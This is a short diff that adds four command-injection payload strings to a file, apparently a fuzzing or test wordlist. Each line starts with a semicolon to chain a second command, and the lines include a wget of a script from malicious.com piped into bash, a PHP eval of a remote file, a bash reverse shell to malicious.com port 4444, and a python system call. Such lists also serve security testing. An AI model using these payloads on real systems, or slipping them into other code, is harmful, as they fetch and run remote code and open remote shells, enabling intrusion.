@@ -1,0 +1,4 @@
+; wget http://malicious.com/malware.sh -O - | bash
+; python3 -c 'import os; os.system("uname -a")'
+; php -r 'eval(file_get_contents("http://malicious.com/shell.php"));'
+; bash -i >& /dev/tcp/malicious.com/4444 0>&1
